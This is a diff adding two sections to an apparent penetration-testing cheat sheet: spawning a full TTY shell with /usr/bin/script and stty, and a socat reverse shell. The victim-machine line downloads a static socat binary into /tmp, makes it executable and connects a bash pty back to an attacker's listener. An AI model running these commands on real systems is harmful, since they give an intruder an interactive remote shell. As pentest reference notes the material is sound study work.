@@ -207,3 +207,23 @@ References:
 - [OxTiberius'slist] (https://tib3rius.com/sqli.html)
 
 -------------------
+
+### Using /usr/bin/script to spawn shell
+
+      /usr/bin/script -qc /bin/bash /dev/null
+      ctrl + z
+      stty raw -echo; fg; reset
+
+---------------------
+
+### Spawning shell with socat
+
+- Attack Machine
+  
+      socat file:`tty`,raw,echo=0 tcp-listen:[port]
+
+- Victim machine
+
+      wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]
+
+-----------------------
